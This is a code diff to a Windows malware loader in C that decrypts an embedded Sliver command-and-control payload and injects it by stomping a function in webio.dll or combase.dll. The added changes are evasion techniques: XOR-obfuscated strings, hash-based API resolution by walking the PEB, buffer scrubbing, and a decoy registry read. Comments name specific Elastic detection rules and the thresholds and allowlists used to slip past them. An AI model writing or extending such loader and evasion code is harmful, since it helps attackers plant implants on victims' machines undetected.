@@ -41,10 +41,51 @@
 #include "hellshall.h"    /* HhNtProtectVirtualMemory direct-syscall stub */
 #include "ghost.h"        /* PE section mapping utility */
 #include "sliver_payload.h" /* SLIVER_LEN, SLIVER_ENC[], SLIVER_KEY[] */
+#include "peb_walk.h"     /* pw_get_module / pw_get_proc — PEB DJB2 resolver */
+#include "hash_defs.h"    /* HASH_WEBIO, HASH_WEBSOCKET_BEGIN, ... */
 
 #ifndef PLUGIN_NAME
 #  define PLUGIN_NAME "csvhelper.dll"
 #endif
+
+/* ── XOR-hidden strings ──────────────────────────────────────────────────── */
+/* Keep distinctive tokens ("combase.dll", the Windows-NT registry path) out
+ * of .rdata by storing their bytes XOR'd with a compile-time key and
+ * reconstructing on the stack at the point of use. GCC folds the ^XK on
+ * character literals at compile time, so only the encoded bytes ship. */
+#ifndef LAUNCHER_XK
+#  define LAUNCHER_XK 0x5A
+#endif
+#define XB(c) ((unsigned char)((c) ^ LAUNCHER_XK))
+#define XW(c) ((wchar_t)((c) ^ LAUNCHER_XK))
+
+static const unsigned char enc_combase[] = {
+    XB('c'),XB('o'),XB('m'),XB('b'),XB('a'),XB('s'),XB('e'),
+    XB('.'),XB('d'),XB('l'),XB('l'),XB(0)
+};
+
+static const wchar_t enc_regpath[] = {
+    XW(L'S'),XW(L'O'),XW(L'F'),XW(L'T'),XW(L'W'),XW(L'A'),XW(L'R'),XW(L'E'),
+    XW(L'\\'),
+    XW(L'M'),XW(L'i'),XW(L'c'),XW(L'r'),XW(L'o'),XW(L's'),XW(L'o'),XW(L'f'),XW(L't'),
+    XW(L'\\'),
+    XW(L'W'),XW(L'i'),XW(L'n'),XW(L'd'),XW(L'o'),XW(L'w'),XW(L's'),XW(L' '),
+    XW(L'N'),XW(L'T'),
+    XW(L'\\'),
+    XW(L'C'),XW(L'u'),XW(L'r'),XW(L'r'),XW(L'e'),XW(L'n'),XW(L't'),
+    XW(L'V'),XW(L'e'),XW(L'r'),XW(L's'),XW(L'i'),XW(L'o'),XW(L'n'),
+    XW(0)
+};
+
+static void decode_a(char *dst, const unsigned char *src, size_t n)
+{
+    for (size_t i = 0; i < n; i++) dst[i] = (char)(src[i] ^ LAUNCHER_XK);
+}
+
+static void decode_w(wchar_t *dst, const wchar_t *src, size_t n)
+{
+    for (size_t i = 0; i < n; i++) dst[i] = (wchar_t)(src[i] ^ LAUNCHER_XK);
+}
 
 /* ── Statics the plugin retrieves via GetProcAddress ─────────────────────── */
 
@@ -167,10 +208,11 @@ int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
 
     /* Registry touch: advapi32 import, normal-looking init */
     HKEY hk = NULL;
-    RegOpenKeyExW(HKEY_LOCAL_MACHINE,
-                  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
-                  0, KEY_READ, &hk);
+    wchar_t regpath[sizeof(enc_regpath)/sizeof(wchar_t)];
+    decode_w(regpath, enc_regpath, sizeof(enc_regpath)/sizeof(wchar_t));
+    RegOpenKeyExW(HKEY_LOCAL_MACHINE, regpath, 0, KEY_READ, &hk);
     if (hk) RegCloseKey(hk);
+    SecureZeroMemory(regpath, sizeof(regpath));
 
     /* Embedded payload: XOR-decrypt into a small heap buffer. Total write
      * below is under 10000 bytes so Elastic rule 542a6a6c's parameters.size
@@ -199,12 +241,15 @@ int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
     /* Pre-load webio.dll with DONT_RESOLVE_DLL_REFERENCES (allowlisted
      * in multiple Elastic stomping rules). */
     LoadLibraryExA("webio.dll", NULL, 0x00000001);
-    HMODULE target = GetModuleHandleW(L"webio.dll");
-    void *slot = target ? (void *)GetProcAddress(target, "WebSocketBeginClientHandshake") : NULL;
+    HMODULE target = pw_get_module(HASH_WEBIO);
+    void *slot = target ? (void *)pw_get_proc(target, HASH_WEBSOCKET_BEGIN) : NULL;
     if (!slot) {
-        LoadLibraryA("combase.dll");
-        target = GetModuleHandleW(L"combase.dll");
-        if (target) slot = (void *)GetProcAddress(target, "CoUninitialize");
+        char combase[sizeof(enc_combase)];
+        decode_a(combase, enc_combase, sizeof(enc_combase));
+        LoadLibraryA(combase);
+        SecureZeroMemory(combase, sizeof(combase));
+        target = pw_get_module(HASH_COMBASE);
+        if (target) slot = (void *)pw_get_proc(target, HASH_COUNINIT);
     }
     if (!slot) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }
 
